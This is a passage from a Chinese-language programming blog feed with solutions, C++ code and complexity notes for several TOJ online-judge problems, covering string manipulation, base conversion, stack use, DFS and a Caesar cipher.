class="comment">// col</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>,cnt=<span class="number">1</span> ; j&lt;<span class="number">6</span> ; j++,cnt=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;<span class="number">5</span> &amp;&amp; !find_ans ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i][j] == arr[i<span class="number">-1</span>][j])</span><br><span class="line">				cnt++;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				cnt=<span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(cnt==<span class="number">3</span>)</span><br><span class="line">				find_ans=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(find_ans)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Yes\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"No\n"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度約為 $O(3nm)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 113</title>
    <url>/2021/03/23/TOJ113/</url>
    <content><![CDATA[<h1 id="TOJ-113"><a href="#TOJ-113" class="headerlink" title="TOJ 113"></a>TOJ 113</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/113/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/113/</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先找出 $P$ 在字串中的位置，再依據移動方向調整即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;s&gt;&gt;c;</span><br><span class="line">    <span class="keyword">int</span> pos=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'P'</span>)&#123;</span><br><span class="line">            pos=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c==<span class="string">'L'</span>)&#123;</span><br><span class="line">        swap(s[pos],s[pos<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        swap(s[pos],s[pos+<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(n)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 169</title>
    <url>/2020/09/12/TOJ169/</url>
    <content><![CDATA[<h2 id="TOJ-169"><a href="#TOJ-169" class="headerlink" title="TOJ 169"></a>TOJ 169</h2><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/169/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/169/</a><br>可見杆問題<br>給一群杆子的高度，求在每根杆子上向左看能看到的杆子數量總和<br>定義能看到是<strong>你所在的桿杆和該桿杆之間的所有桿杆高度都小於你所在的桿杆的高度</strong></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察能被其他杆子看到的集合所形成的序列可以發現是呈現 <strong>遞增</strong> 的狀態<br>因此我們只要能維護一個嚴格遞增的序列，剩下的就必定會是能被看到的杆子<br>因為這裡的狀態是先進後出，跟stack一樣，所以選擇stack<br>stack的頂與當前元素之間的元素數量即為當前杆子能看到的數量</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Max_N = <span class="number">1e7</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> t,n,m,arr[Max_N];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; st;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">	<span class="built_in">cin</span>.tie(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">cout</span>.tie(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;t)&#123;</span><br><span class="line">		st.clear();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=t ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">			<span class="keyword">while</span>(!st.empty() &amp;&amp; arr[i]&gt;arr[st.back()])</span><br><span class="line">				st.pop_back();</span><br><span class="line">			<span class="keyword">if</span>(i<span class="number">-1</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			<span class="keyword">if</span>(st.empty()) <span class="built_in">cout</span>&lt;&lt;i<span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;(i-st.back()<span class="number">-1</span>);</span><br><span class="line">			st.push_back(i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>掃過一次字串即可，複雜度 $O(t)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 115</title>
    <url>/2021/03/23/TOJ115/</url>
    <content><![CDATA[<h1 id="TOJ-115"><a href="#TOJ-115" class="headerlink" title="TOJ 115"></a>TOJ 115</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/115/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/115/</a></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> arr[<span class="number">11</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">11</span> ; i++)&#123;</span><br><span class="line">        arr[i] = <span class="string">"EMPTY"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">string</span> s;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s&gt;&gt;m;</span><br><span class="line">        arr[m]=s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=<span class="number">10</span> ; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;arr[i]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(nm)$ ，其中 $m$ 表示可以覆蓋的總牌數</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 18</title>
    <url>/2021/03/23/TOJ18/</url>
    <content><![CDATA[<h1 id="TOJ-18"><a href="#TOJ-18" class="headerlink" title="TOJ 18"></a>TOJ 18</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/18/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/18/</a></p>
<p>輸入一個字串 $S$</p>
<p>定義一個字串是強效字串，唯有在 $S$ 只留下英文字母時，從頭看到尾與從尾看到頭，不分大小寫是相同的</p>
<p>如果是強效字串，在字串前加上 <code>SETUP!</code></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先利用一個 tmp 字串記錄字串 $S$ 去除英文字母以外的字元，且將字母都轉為小寫的樣子</p>
<p>接下來只需要檢查 tmp 是不是回文即可</p>
<p>判斷方式可以從同到字串的頭到字串的一半，檢查頭尾是否相同</p>
<p>也就是 $tmp[i] = tmp[tmp.size()-1-i]$ 是否成立</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,s))&#123;</span><br><span class="line">		<span class="built_in">string</span> tmp=<span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((s[i]&gt;=<span class="string">'A'</span> &amp;&amp; s[i]&lt;=<span class="string">'Z'</span>) || (s[i]&gt;=<span class="string">'a'</span> &amp;&amp; s[i]&lt;=<span class="string">'z'</span>))</span><br><span class="line">				tmp+=<span class="built_in">tolower</span>(s[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">bool</span> powerful=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>, j=tmp.size()<span class="number">-1</span> ; i&lt;tmp.size()/<span class="number">2</span> ; i++, j--)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tmp[i]!=tmp[j])&#123;</span><br><span class="line">				powerful=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(powerful)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"SETUP! "</span>&lt;&lt;s&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總複雜度約為 $O(2len(s))$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 244</title>
    <url>/2021/03/23/TOJ244/</url>
    <content><![CDATA[<h1 id="TOJ-244"><a href="#TOJ-244" class="headerlink" title="TOJ 244"></a>TOJ 244</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/244/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/244/</a></p>
<p>將輸入的字串中小寫轉大寫，大寫轉小寫</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;s;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s[i]&lt;=<span class="string">'Z'</span>)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;(<span class="keyword">char</span>)(s[i]-<span class="string">'A'</span>+<span class="string">'a'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;(<span class="keyword">char</span>)(s[i]-<span class="string">'a'</span>+<span class="string">'A'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h3><p>總時間複雜度為 $O(n)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 292</title>
    <url>/2021/03/23/TOJ292/</url>
    <content><![CDATA[<h1 id="TOJ-292"><a href="#TOJ-292" class="headerlink" title="TOJ 292"></a>TOJ 292</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/292/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/292/</a></p>
<p>給三個整數 $A, B, C$ ，表示 $C$ 當前為 $A$ 進位制，求轉換成 $B$ 進位制的樣子。其中，我們只會在 $2$~$10$ 進位制之間轉換</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><ol>
<li>先將 $C$ 想辦法換成我們熟悉的數字表示方式十進位</li>
<li>統一從十進位轉換為其他進位制</li>
</ol>
<p>而我們可以透過進位制本身的定義去想，例如 $216 = 2<em>10^2 + 1</em>10^1 + 6*10^0$。那麼，我們就可以將任意進位制的數值轉換成我們熟悉的樣子了。</p>
<p>要從十進位轉換成其他進位制，可以直接模擬短除法來達成。例如要將 $15_{10}$ 轉成二進位表示。</p>
<p>$15/2 = 7 … 1$</p>
<p>$\ \ 7/2 = 3 … 1$</p>
<p>$\ \ 3/2 = 1 … 1$</p>
<p>那麼我們可以獲得 $1111_{2}$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">N_to_dec</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; num ; i++, num/=<span class="number">10</span>)&#123;</span><br><span class="line">		ans+=(num%<span class="number">10</span>)*<span class="built_in">pow</span>(n,i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">dec_to_M</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> ans=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>( ; num ; num/=m)&#123;</span><br><span class="line">		ans = <span class="keyword">char</span>(num%m + <span class="string">'0'</span>) + ans;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> A,B,C;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;A&gt;&gt;B&gt;&gt;C;</span><br><span class="line">	<span class="keyword">if</span>(C==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"0\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dec_to_M(B,N_to_dec(A,C))&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>先轉換成十進位的時間複雜度為 $O(log_{10}{n})$</p>
<p>轉換成其他進位的時間複雜度為 $O(log_{10}{n})$</p>
<p>總時間複雜度約為 $O(log_{10}{n})$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 362</title>
    <url>/2021/03/23/TOJ362/</url>
    <content><![CDATA[<h1 id="TOJ-362"><a href="#TOJ-362" class="headerlink" title="TOJ 362"></a>TOJ 362</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/362/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/362/</a></p>
<p>現在有一副撲克牌，分成 $4$ 堆，每一堆都有 $13$ 張牌</p>
<p>現在我們要從 $4$ 個牌堆當中每次選兩張相同的拿出，最後是否有辦法把全部的牌拿完?</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>我們可以枚舉在每一層當前的 $4$ 張牌當中要取哪兩張，把所有的情況列出，如果能將全部的牌取完就表示有答案，否則沒有</p>
<p>至於要如何知道牌堆中哪張牌是最上方的，我們可以用一個陣列去紀錄 $4$ 個牌堆最上方的牌是牌堆中的第幾張，如此一來要枚舉的時候就只需要改變紀錄的 index 即可</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">4</span>][<span class="number">13</span>];</span><br><span class="line"><span class="keyword">int</span> top[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">bool</span> found=<span class="literal">false</span>, ans=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == <span class="number">26</span>)&#123;</span><br><span class="line">		ans=<span class="literal">true</span>;</span><br><span class="line">		found=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span> ; j&lt;<span class="number">4</span> &amp;&amp; !found ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(top[i]&lt;<span class="number">13</span> &amp;&amp; top[j]&lt;<span class="number">13</span> &amp;&amp; arr[i][top[i]] == arr[j][top[j]])&#123;</span><br><span class="line">				top[i]++;</span><br><span class="line">				top[j]++;</span><br><span class="line">				DFS(depth+<span class="number">1</span>);</span><br><span class="line">				top[i]--;</span><br><span class="line">				top[j]--;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; i++)&#123;</span><br><span class="line">		top[i] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">13</span> ; j++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DFS(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(ans)&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"YES\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"NO\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>令 $n = 4, m = 13$</p>
<p>輸入時間複雜度為 $O(nm)$</p>
<p>DFS 每層最多有 $4$ 種選擇，總共有 $26$ 層</p>
<p>DFS 時間複雜度為 $O(n^{2m})$</p>
<p>總時間複雜度為 $O(nm + n^{2m})$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ274</title>
    <url>/2020/09/21/TOJ274/</url>
    <content><![CDATA[<h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://toj.tfcis.org/oj/pro/274/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/274/</a><br>定義單錯誤迴文為一個字串中只除去一個字元後，剩下的字串為迴文<br>給一個字串，求該字串是否為單錯誤迴文</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於一個字串 $s$ ，檢查其左右兩端 $L$ $R$<br>如果 $s[L] == s[R]$ 那麼就繼續檢查 $L+1$ 到 $R-1$<br>否則判斷 $L+1$ 到 $R$ 這個字串以及 $L$ 到 $R-1$ 這個字串誰是迴文<br>如果在這其中錯誤超過 $1$ 次，那就表示這不是單錯誤迴文</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> err)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(;l&lt;r;l++,r--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s[l]==s[r])</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(err==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">return</span> check(l+<span class="number">1</span>,r,err+<span class="number">1</span>) || check(l,r<span class="number">-1</span>,err+<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">while</span>(n--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;(check(<span class="number">0</span>,s.size()<span class="number">-1</span>,<span class="number">0</span>) == <span class="literal">true</span> ? <span class="string">"YES\n"</span> : <span class="string">"NO\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>對於一個字串至多檢查全部<br>複雜度 $O(nlen(s))$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
        <tag>遞迴</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 127</title>
    <url>/2021/03/23/TOJ127/</url>
    <content><![CDATA[<h1 id="TOJ-127"><a href="#TOJ-127" class="headerlink" title="TOJ 127"></a>TOJ 127</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/127/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/127/</a></p>
<p>凱薩加密</p>
<p>給一個數字 $n$ 以及一個字串 $S$ ，求將字串 $S$ 中的所有字元 $c$ 逆回 $n$ 之後的字串</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>首先考慮到如果 $n$ 大於 26 的情況，其實跟 $n%26$ 是相同的，所以先處理 $n$</p>
<p>接下來針對每個字元處理位移量</p>
<p>如果超出範圍，可以保證只需要再加上一個 26 就可以得到答案</p>
<p>否則直接扣掉 $n$ 即可</p>
